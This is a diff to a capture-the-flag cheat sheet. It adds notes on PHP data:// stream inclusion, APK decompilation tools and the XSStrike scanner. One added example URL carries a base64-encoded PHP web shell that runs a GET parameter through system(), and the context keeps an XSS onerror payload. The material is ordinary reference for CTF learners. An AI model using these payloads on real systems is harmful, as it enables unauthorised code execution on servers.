@@ -275,6 +275,15 @@ http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 ```
 
 
+* `data://text/plain;base64`
+
+	A [PHP] stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:
+
+```
+http://103.5.112.91:1234/?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
+``` 
+
+
 PDF Files
 -------------
 
@@ -352,6 +361,28 @@ PNG File Forensics
 	A command-line tool for "checking" a [PNG] image file. Especially good for verifying checksums.
 
 
+APK Forensics
+---------------
+
+* [`apktool`][apktool]
+
+	A command-line tool to extract all the resources from an APK file. Usage:
+
+```
+apktool d <file.apk>
+```
+
+
+* [`dex2jar`][dex2jar]
+
+	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.
+
+
+* [`jd-gui`][jd-gui]
+
+	A GUI tool to decompile Java code, and JAR files.
+	
+
 Web
 ----------------
 
@@ -383,6 +414,10 @@ Web
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 ```
 
+* [XSStrike]
+
+	A command-line tool for automated [XSS] attacks. Seems to function like how [sqlmap] does.
+
 * [`wpscan`][wpscan]
 
 	* A Ruby script to scan and do reconnaissance on a [Wordpress] application. 
@@ -409,7 +444,7 @@ Web
 
 * Explicit SQL Injection
 
-
+	
 
 * Blind SQL Injection
 
@@ -443,7 +478,7 @@ Windows Executables
 
 * jetBrains .NET decompiler
 
-* AutoIT
+* AutoIT converter
 
 Python Reversing
 ------------
@@ -467,16 +502,6 @@ Binary/pwn
 * 64-bit Buffer Overflow
 
 	64-bit buffer overflow challenges are often difficult because the null bytes get in the way of memory addresses (for the function you want to jump to, that you can usually find with `readelf -s`). But, check if whether or not the function address you need starts with the same hex values already on the stack (in `rsp`). Maybe you only have to write two or three bytes after the overflow, rather than the whole function address. 
-
-
-Java Reversing
-----------
-
-
-
-
-Android APK Reversing
------------
 
 
 VisualBasicScript Reversing
@@ -571,3 +596,10 @@ sudo apt install -y caca-utils
 [Atbash Cipher]: https://en.wikipedia.org/wiki/Atbash
 [TestDisk]: https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2
 [PNG]: https://en.wikipedia.org/wiki/Portable_Network_Graphics
+[jd-gui]: https://github.com/java-decompiler/jd-gui
+[dex2jar]: https://github.com/pxb1988/dex2jar
+[apktool]: https://ibotpeaches.github.io/Apktool/
+[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
+[remote code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
+[arbitrary code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
+[XSStrike]: https://github.com/UltimateHackers/XSStrike
